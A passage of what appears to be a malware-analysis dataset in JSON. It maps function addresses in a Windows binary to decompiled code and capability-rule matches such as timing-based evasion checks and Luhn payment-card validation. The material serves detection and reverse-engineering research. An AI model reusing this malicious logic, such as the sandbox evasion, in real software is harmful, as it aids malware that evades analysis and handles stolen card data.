        "decompiled_code": "\nvoid __cdecl fcn.00402dd0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00401350();\n        fcn.00404500();\n        fcn.004041b0();\n        if (*0x4224b8 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004010b0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 147
    },
    "004030c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040314f) overlaps instruction at (ram,0x0040314d)\n// \n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.004030c0(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t unaff_EBX;\n    uchar *puVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puVar7 = &var_2h + 2;\n    iVar5 = arg_14h * 2;\n    if (0 < arg_14h) {\n        iVar8 = 1;\n        do {\n            uVar4 = iVar5;\n            bVar9 = (POPCOUNT(arg_14h & 0xff) & 1U) == 0;\n            if ((bVar9) || (!bVar9)) {\n                uVar4 = *(*(puVar7 + -8) + *(puVar7 + 0x10));\n                iVar5 = iVar8;\n            }\n            else {\n                puVar7 = *0x8b17b43a;\n                puVar1 = unaff_EBX + 0xc8af845;\n                uVar2 = *puVar1;\n                *puVar1 = *puVar1 + uVar4;\n                *0x34a96cfe = *0x34a96cfe + (unaff_EBX >> 8) + CARRY1(uVar2, uVar4);\n                iVar5 = 0x34a96cf4;\n            }\n            uVar6 = iVar5 % *(puVar7 + 0xc);\n            iVar8 = *(puVar7 + 8);\n            uVar2 = *(uVar6 + iVar8);\n            uVar6 = uVar6 & 0xffffff00 | uVar2;\n            puVar7[-2] = uVar2;\n            bVar9 = (unaff_EBX + 1U ^ 0x50) < '\\0';\n            if ((bVar9) || (!bVar9)) {\n                iVar8 = iVar5 + -1;\n                uVar6 = iVar8 >> 0x1f;\n            }\n            puVar7[-1] = uVar4 ^ *(CONCAT44(iVar8, uVar6) % *(puVar7 + 0xc) + *(puVar7 + 8));\n            uVar4 = puVar7[-0xc];\n            iVar3 = *(puVar7 + 0x18);\n            *(iVar3 + -1 + iVar5) = uVar4 ^ puVar7[-1];\n            unaff_EBX = unaff_EBX & 0xffffff00 | puVar7[-2];\n            iVar8 = iVar5 + 2;\n            *(iVar5 + iVar3) = uVar4 ^ puVar7[-2];\n            iVar5 = *(puVar7 + 0x14);\n            iVar3 = *(puVar7 + -8) + 1;\n            arg_14h = iVar3 - iVar5;\n            *(puVar7 + -8) = iVar3;\n        } while (iVar3 < iVar5);\n    }\n    return;\n}\n",
        "token_count": 778
    },
    "00403880": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403936) overlaps instruction at (ram,0x00403935)\n// \n// WARNING: Removing unreachable block (ram,0x00403928)\n// WARNING: Removing unreachable block (ram,0x00403932)\n// WARNING: Removing unreachable block (ram,0x00403936)\n\nbool __cdecl fcn.00403880(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    uint var_4h;\n    \n    if ((in_CF) || (!in_CF)) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &var_4h);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            return iVar1 == 0;\n        }\n        return false;\n    }\n    if (&stack0xfffffff4 < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (in_EAX == 0xffffffff) {\n        return true;\n    }\n    return false;\n}\n",
        "token_count": 370
    },
    "00403b40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403b70) overlaps instruction at (ram,0x00403b6e)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00403b40(uint param_1, uchar *param_2, uchar *param_3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    unkbyte3 Var4;\n    int32_t *piVar5;\n    uint uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint32_t *puVar9;\n    code *pcVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint8_t extraout_CL;\n    int32_t iVar13;\n    int32_t unaff_EBX;\n    uchar *unaff_EBP;\n    uint unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar14;\n    uint32_t *in_FS_OFFSET;\n    bool bVar15;\n    bool bVar16;\n    uchar uStack00000020;\n    uchar *puStack00000021;\n    ulong in_stack_00000020;\n    uint var_24ch;\n    uint var_147h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint pbstr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar auStack592 [260];\n    uchar uStack332;\n    uint uStack331;\n    uint var_44h_2;\n    uchar uStack68;\n    uchar uStack67;\n    ushort uStack66;\n    uchar uStack64;\n    ushort uVar17;\n    uchar uVar18;\n    uchar uStack59;\n    ushort uStack58;\n    uchar uStack56;\n    uchar uStack55;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar uStack28;\n    uchar uStack27;\n    ushort uStack26;\n    uchar uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uchar uStack20;\n    uchar uStack19;\n    ushort uStack18;\n    uint32_t var_ch_2;\n    uint uStack12;\n    uint uStack8;\n    uchar uStack4;\n    uchar uStack3;\n    ushort uStack2;\n    \n    do {\n        uStack4 = SUB41(unaff_EBP, 0);\n        uStack3 = unaff_EBP >> 8;\n        uStack2 = unaff_EBP >> 0x10;\n        uStack8 = 0xffffffff;\n        uStack12 = 0x405280;\n        var_ch_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00403b40::var_ch_2;\n        (*_sym.imp.ole32.dll_CoInitialize)(0, unaff_EDI);\n        unaff_EDI = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4113fc);\n        bVar15 = false;\n        bVar16 = unaff_EDI == 0;\n        var_44h_2._0_1_ = unaff_EDI;\n        var_44h_2._1_1_ = unaff_EDI >> 8;\n        var_44h_2._2_2_ = unaff_EDI >> 0x10;\n        puVar7 = param_2;\n        puVar8 = param_3;\n        do {\n            param_3 = puVar8;\n            param_2 = puVar7;\n            if (bVar16) {\n                *in_FS_OFFSET = var_ch_2;\n                return 1;\n            }\n            uStack4 = 8;\n            uStack3 = 0x14;\n            uStack2 = 0x41;\n            uStack8 = 0x403b9e;\n            puVar9 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n            if ((bVar15) || (!bVar15)) {\n                param_2._1_3_ = CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1));\n                puStack00000021 = &stack0xffffffe4;\n                uStack00000020 = 0;\n                param_3 = CONCAT31(puVar9, param_1._3_1_);\n                param_1._1_1_ = 0xdd;\n                param_1._2_1_ = 0x3b;\n                param_1._3_1_ = 0x40;\n                param_2._0_1_ = 0;\n                (*_sym.imp.USER32.dll_SendMessageTimeoutA)();\n                param_1._1_1_ = 0x1c;\n                param_1._2_1_ = 0x14;\n                param_1._3_1_ = 0x41;\n                param_2 = param_2._1_3_ << 8;\n                param_1._0_1_ = unaff_EDI >> 0x18;\n                uStack3 = 0xb;\n                uStack2 = 0x403c;\n                pcVar10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                if (pcVar10 == NULL) {\n                    *in_FS_OFFSET = var_ch_2;\n                    return 1;\n                }\n                piStack36 = NULL;\n                uStack3 = SUB41(&stack0xffffffdc, 0);\n                uStack2 = &stack0xffffffdc >> 8;\n                uStack4 = 0;\n                uStack12 = CONCAT31(0x406190, uStack26 >> 8);\n                uStack8 = 0;\n                uStack19 = 0x3d;\n                uStack18 = 0x403c;\n                var_ch_2 = CONCAT22(uStack26, CONCAT11(uStack27, uStack28)) << 8;\n                iVar11 = (*pcVar10)();\n                uStack23 = SUB41(piStack36, 0);\n                uStack19 = uStack23;\n                uStack22 = piStack36 >> 8;\n                uStack18 = uStack22;\n                if ((iVar11 < 0) || (piStack36 == NULL)) {\n                    uStack8 = 0xffffffff;\n                    if (piStack36 != NULL) {\n                        var_ch_2 = var_ch_2 & 0xffffff00 | piStack36 >> 0x18;\n                        uStack23 = 0x18;\n                        uStack22 = 0x4040;\n                        uStack20 = 0;\n                        (**(*piStack36 + 8))();\n                    }\n                    goto code_r0x00403fc4;\n                }\n                uStack40 = NULL;\n                uStack19 = SUB41(&stack0xffffffd8, 0);\n                uStack18 = &stack0xffffffd8 >> 8;\n                var_ch_2 = var_ch_2 & 0xffffff00 | &stack0xffffffd8 >> 0x18;\n                uStack20 = piStack36 >> 0x18;\n                uStack8._0_1_ = 1;\n                uStack27 = 99;\n                uStack26 = 0x403c;\n                uStack24 = 0;\n                iVar11 = (**(*piStack36 + 0x20))();\n                uStack23 = SUB41(uStack40, 0);\n                uStack19 = uStack23;\n                uStack22 = uStack40 >> 8;\n                uStack18 = uStack22;\n                if ((-1 < iVar11) && (uStack40 != NULL)) {\n                    uStack32 = 0;\n                    uStack19 = SUB41(&stack0xffffffe0, 0);\n                    uStack18 = &stack0xffffffe0 >> 8;\n                    var_ch_2 = var_ch_2 & 0xffffff00 | &stack0xffffffe0 >> 0x18;\n                    uStack20 = uStack40 >> 0x18;\n                    uStack27 = 0x85;\n                    uStack26 = 0x403c;\n                    uStack24 = 0;\n                    (**(*uStack40 + 0x24))();\n                    uStack68 = 0;\n                    uStack67 = 0;\n                    uStack66 = 0;\n                    if (uStack32 < 1) goto code_r0x00403f9d;\n                    goto code_r0x00403c93;\n                }\n                uStack8 = uStack8._1_3_ << 8;\n                if (uStack40 != NULL) {\n                    var_ch_2 = var_ch_2 & 0xffffff00 | uStack40 >> 0x18;\n                    uStack23 = 0xf1;\n                    uStack22 = 0x403f;\n                    uStack20 = 0;\n                    (**(*uStack40 + 8))();\n                }\n                uStack8 = 0xffffffff;\n                if (piStack36 != NULL) {\n                    uStack19 = SUB41(piStack36, 0);\n                    uStack18 = piStack36 >> 8;\n                    var_ch_2 = var_ch_2 & 0xffffff00 | piStack36 >> 0x18;\n                    uStack23 = 5;\n                    uStack22 = 0x4040;\n                    uStack20 = 0;\n                    (**(*piStack36 + 8))();\n                }\n                goto code_r0x00403fc4;\n            }\n            puStack00000021 = 0xb7f8c08b;\n            if (&stack0x00000025 < *puVar9 || puVar9 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            param_3 = &stack0x00000020;\n            param_1._0_1_ = unaff_ESI;\n            param_1._1_1_ = unaff_ESI >> 8;\n            param_1._2_1_ = unaff_ESI >> 0x10;\n            param_1._3_1_ = unaff_ESI >> 0x18;\n            puVar1 = unaff_EBX + -0x76007a08;\n            bVar15 = CARRY1(*puVar1, extraout_CL);\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + extraout_CL;\n            bVar16 = *puVar1 == 0;\n            unaff_EBP = &stack0xfffffffc;\n            param_2 = &stack0xfffffffc;\n            puVar7 = &stack0xfffffffc;\n            puVar8 = &stack0x00000020;\n        } while (SCARRY1(uVar2, extraout_CL) != *puVar1 < '\\0');\n    } while( true );\ncode_r0x00403c93:\n    do {\n        uStack19 = 0x99;\n        uStack18 = 0x403c;\n        var_ch_2 = var_ch_2 & 0xffffff00;\n        iVar12 = (*_sym.imp.MSVCRT.dll_rand)();\n        uVar6 = uStack44;\n        uVar17 = uStack54;\n        iVar12 = iVar12 % uStack32;\n        param_1._0_1_ = 0;\n        param_1._1_1_ = 0;\n        param_1._2_1_ = 0;\n        param_1._3_1_ = 0;\n        uStack19 = SUB41(&stack0x00000004, 0);\n        uStack18 = &stack0x00000004 >> 8;\n        var_ch_2 = var_ch_2 & 0xffffff00 | &stack0x00000004 >> 0x18;\n        iVar11 = *uStack40;\n        uStack8._0_1_ = 4;\n        Var4 = CONCAT22(uStack54, 3);\n        uStack32._0_1_ = uStack54 >> 8;\n        uStack28 = uStack52 >> 0x18;\n        uStack27 = iVar12;\n        uStack26 = iVar12 >> 8;\n        uStack24 = iVar12 >> 0x18;\n        uStack23 = uStack44;\n        uStack22 = uStack44 >> 8;\n        uStack20 = uStack44 >> 0x18;\n        uStack55 = SUB41(uStack40, 0);\n        uStack54 = uStack40 >> 8;\n        uStack52 = CONCAT31(Var4, uStack40 >> 0x18);\n        uStack48 = CONCAT31(uStack52, uStack32);\n        uStack40._1_3_ = uVar6;\n        uStack40 = CONCAT31(uStack40._1_3_, uStack24);\n        piStack36 = CONCAT31(Var4, uStack20);\n        uStack56 = 0;\n        iVar11 = (**(iVar11 + 0x2c))();\n        Var4 = CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1));\n        piVar3 = CONCAT13(param_1._3_1_, Var4);\n        if ((iVar11 < 0) || (piVar3 == NULL)) {\n            piVar5 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n            uStack8._0_1_ = 3;\n            if (piVar5 != NULL) {\n                uStack56 = uStack18 >> 8;\n                (**(*piVar5 + 8))();\n                piVar3 = CONCAT13(param_1._3_1_, CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1)));\n            }\njoined_r0x00403f8b:\n            uStack8._0_1_ = 2;\n            if (piVar3 != NULL) {\n                uStack8._0_1_ = 2;\n                uStack56 = piVar3 >> 0x18;\n                (**(*piVar3 + 8))();\n            }\n            uStack56 = &stack0xffffffc8 >> 0x18;\ncode_r0x00403f97:\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n            break;\n        }\n        uStack56 = &stack0xffffffec >> 0x18;\n        uStack67 = param_1;\n        uStack66 = Var4 >> 8;\n        uStack64 = param_1._3_1_;\n        var_44h_2._1_1_ = 0x10;\n        var_44h_2._2_2_ = 0x403d;\n        uStack68 = 0;\n        iVar11 = (***piVar3)();\n        piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n        if ((iVar11 < 0) || (piVar3 == NULL)) {\njoined_r0x00403f52:\n            if (piVar3 != NULL) {\n                uStack8._0_1_ = 3;\n                uStack56 = piVar3 >> 0x18;\n                (**(*piVar3 + 8))();\n            }\n            piVar3 = CONCAT13(param_1._3_1_, CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1)));\n            uStack8._0_1_ = 2;\n            if (piVar3 != NULL) {\n                uStack56 = param_1._3_1_;\n                (**(*piVar3 + 8))();\n            }\n            uStack56 = &stack0xffffffc8 >> 0x18;\n            goto code_r0x00403f97;\n        }\n        uStack59 = SUB41(&stack0xffffffc4, 0);\n        uStack58 = &stack0xffffffc4 >> 8;\n        uStack56 = &stack0xffffffc4 >> 0x18;\n        uVar18 = uStack18 >> 8;\n        uStack67 = 0x2f;\n        uStack66 = 0x403d;\n        uStack64 = 0;\n        iVar11 = (**(*piVar3 + 0x38))();\n        if (iVar11 < 0) {\ncode_r0x00403f13:\n            piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n            goto joined_r0x00403f52;\n        }\n        iVar12 = CONCAT22(uStack58, CONCAT11(uStack59, uVar18));\n        if (iVar12 == 0) {\n            piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\njoined_r0x00403d8e:\n            if (piVar3 != NULL) {\n                uStack8._0_1_ = 3;\n                uStack56 = piVar3 >> 0x18;\n                (**(*piVar3 + 8))();\n            }\n            piVar3 = CONCAT13(param_1._3_1_, CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1)));\n            uStack8._0_1_ = 2;\n            if (piVar3 != NULL) {\n                uStack56 = param_1._3_1_;\n                (**(*piVar3 + 8))();\n            }\n            uStack56 = &stack0xffffffc8 >> 0x18;\n        }\n        else {\n            uStack56 = 0;\n            uStack66 = iVar12 >> 8;\n            uStack64 = &stack0xffffffc4 >> 0x10;\n            var_44h_2._1_1_ = 0x5f;\n            var_44h_2._2_2_ = 0x403d;\n            uStack68 = 0;\n            uStack67 = uVar18;\n            fcn.00403950();\n            uStack56 = 0;\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n            uStack67 = SUB41(&stack0xfffffdb0, 0);\n            uStack66 = &stack0xfffffdb0 >> 8;\n            uStack64 = &stack0xfffffdb0 >> 0x18;\n            var_44h_2._1_1_ = 0x7e;\n            var_44h_2._2_2_ = 0x403d;\n            uStack68 = 0;\n            iVar12 = (*_sym.imp.MSVCRT.dll__stricmp)();\n            if (iVar12 != 0) {\n                piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n                goto joined_r0x00403d8e;\n            }\n            uStack24 = 0;\n            uStack23 = 0;\n            uStack22 = 0;\n            Var4 = CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1));\n            uStack56 = &stack0xffffffe8 >> 0x18;\n            uStack67 = param_1;\n            uStack66 = Var4 >> 8;\n            uStack64 = param_1._3_1_;\n            uStack8._0_1_ = 5;\n            var_44h_2._1_1_ = 200;\n            var_44h_2._2_2_ = 0x403d;\n            uStack68 = 0;\n            iVar11 = (***CONCAT13(param_1._3_1_, Var4))();\n            piVar3 = CONCAT22(uStack22, CONCAT11(uStack23, uStack24));\n            uVar17 = piVar3 >> 8;\n            if ((iVar11 < 0) || (piVar3 == NULL)) {\n                uStack8._0_1_ = 4;\n                if (piVar3 != NULL) {\n                    uStack56 = uStack22 >> 8;\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\njoined_r0x00403f37:\n                if (piVar3 != NULL) {\n                    uStack8._0_1_ = 3;\n                    uStack56 = piVar3 >> 0x18;\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT13(param_1._3_1_, CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1)));\n                goto joined_r0x00403f8b;\n            }\n            uStack56 = &stack0xffffffc0 >> 0x18;\n            uStack67 = 0xe7;\n            uStack66 = 0x403d;\n            uStack64 = 0;\n            uVar18 = uStack24;\n            iVar11 = (**(*piVar3 + 0x20))();\n            uStack56 = uStack22 >> 8;\n            if (iVar11 < 0) {\n                piVar3 = CONCAT22(uStack22, CONCAT11(uStack23, uStack24));\n                uStack8._0_1_ = 4;\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n                goto joined_r0x00403f37;\n            }\n            iVar12 = CONCAT22(uVar17, CONCAT11(uVar18, uStack64));\n            if (iVar12 == 0) {\n                piVar3 = CONCAT22(uStack22, CONCAT11(uStack23, uStack24));\n                uStack8._0_1_ = 4;\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n                uStack8._0_1_ = 3;\n                if (piVar3 != NULL) {\n                    uStack56 = uStack18 >> 8;\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT13(param_1._3_1_, CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1)));\n            }\n            else {\n                uStack332 = 0;\n                puVar14 = &stack0xfffffeb5;\n                for (iVar13 = 0x40; iVar13 != 0; iVar13 = iVar13 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                *puVar14 = 0;\n                *(puVar14 + 2) = 0;\n                uStack56 = 0;\n                uStack67 = uStack64;\n                uStack66 = iVar12 >> 8;\n                uStack64 = uVar17 >> 8;\n                var_44h_2._1_1_ = 0x55;\n                var_44h_2._2_2_ = 0x403e;\n                uStack68 = 0;\n                uVar18 = &stack0xfffffeb4 >> 0x10;\n                fcn.00403950();\n                uStack56 = uVar18;\n                (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                uStack67 = 0x6e;\n                uStack66 = 0x403e;\n                uStack64 = 0;\n                iVar12 = fcn.00403a70(&stack0xfffffeb4);\n                if (iVar12 == 0) {\n                    uStack67 = 0xf6;\n                    uStack66 = 0x403e;\n                    uStack64 = 0;\n                    (*_sym.imp.KERNEL32.dll_Sleep)();\n                    piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n                    uStack67 = uStack20;\n                    uStack66 = piVar3 >> 8;\n                    uStack64 = uStack18 >> 8;\n                    var_44h_2._1_1_ = 2;\n                    var_44h_2._2_2_ = 0x403f;\n                    uStack68 = 0;\n                    (**(*piVar3 + 0x114))();\n                    piVar3 = CONCAT22(uStack22, CONCAT11(uStack23, uStack24));\n                    uStack8._0_1_ = 4;\n                    if (piVar3 != NULL) {\n                        uStack56 = uStack22 >> 8;\n                        (**(*piVar3 + 8))();\n                    }\n                    goto code_r0x00403f13;\n                }\n                uStack67 = 0x7c;\n                uStack66 = 0x403e;\n                uStack64 = 0;\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n                piVar3 = CONCAT22(uStack22, CONCAT11(uStack23, uStack24));\n                uStack8._0_1_ = 4;\n                if (piVar3 != NULL) {\n                    uStack56 = uStack22 >> 8;\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT22(uStack18, CONCAT11(uStack19, uStack20));\n                uStack8._0_1_ = 3;\n                if (piVar3 != NULL) {\n                    uStack56 = uStack18 >> 8;\n                    (**(*piVar3 + 8))();\n                }\n                piVar3 = CONCAT13(param_1._3_1_, CONCAT12(param_1._2_1_, CONCAT11(param_1._1_1_, param_1)));\n            }\n            uStack8._0_1_ = 2;\n            if (piVar3 != NULL) {\n                uStack8._0_1_ = 2;\n                uStack56 = piVar3 >> 0x18;\n                (**(*piVar3 + 8))();\n            }\n            uStack56 = &stack0xffffffc8 >> 0x18;\n        }\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n        iVar12 = CONCAT22(uStack66, CONCAT11(uStack67, uStack68)) + 1;\n        uStack68 = iVar12;\n        uStack67 = iVar12 >> 8;\n        uStack66 = iVar12 >> 0x10;\n    } while (iVar12 < uStack32);\ncode_r0x00403f9d:\n    uStack8 = uStack8._1_3_ << 8;\n    if (uStack40 != NULL) {\n        uStack19 = SUB41(uStack40, 0);\n        uStack18 = uStack40 >> 8;\n        var_ch_2 = var_ch_2 & 0xffffff00 | uStack40 >> 0x18;\n        uStack23 = 0xad;\n        uStack22 = 0x403f;\n        uStack20 = 0;\n        (**(*uStack40 + 8))();\n    }\n    uStack8 = 0xffffffff;\n    if (piStack36 != NULL) {\n        uStack19 = SUB41(piStack36, 0);\n        uStack18 = piStack36 >> 8;\n        var_ch_2 = var_ch_2 & 0xffffff00 | piStack36 >> 0x18;\n        uStack23 = 0xc1;\n        uStack22 = 0x403f;\n        uStack20 = 0;\n        (**(*piStack36 + 8))();\n    }\n    unaff_EDI = CONCAT22(var_44h_2._2_2_, CONCAT11(var_44h_2._1_1_, var_44h_2));\ncode_r0x00403fc4:\n    uStack19 = unaff_EDI;\n    uStack18 = unaff_EDI >> 8;\n    var_ch_2 = var_ch_2 & 0xffffff00 | unaff_EDI >> 0x18;\n    uStack23 = 0xcb;\n    uStack22 = 0x403f;\n    uStack20 = 0;\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n    uStack23 = 0xd1;\n    uStack22 = 0x403f;\n    uStack20 = 0;\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch_2;\n    return iVar11;\n}\n",
        "token_count": 6344
    },
    "004041b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get Program Files directory"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404398) overlaps instruction at (ram,0x00404395)\n// \n// WARNING: Removing unreachable block (ram,0x004042fe)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004041b0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar uVar6;\n    uchar var_260h;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401cc0();\n    iVar4 = fcn.00403980();\n    if (iVar4 != 0) {\n        var_260h = 0;\n        puVar5 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &var_260h, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.004037e0();\n            s = 0;\n            puVar5 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4113b0, &var_260h, 0x411390, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar5 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar1)(3000);\n                (*pcVar3)(fcn.004040b0, var_8h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                uVar6 = SBORROW4(iVar4, 0x102);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar6) && (uVar6)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar2)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "00404700": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040479f)\n\nuint __cdecl fcn.00404700(uint StringSid)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(*0x10 + -0x21c, *0x10 + -0x10);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, 0xec);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, StringSid);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 283
    },
    "00404c70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
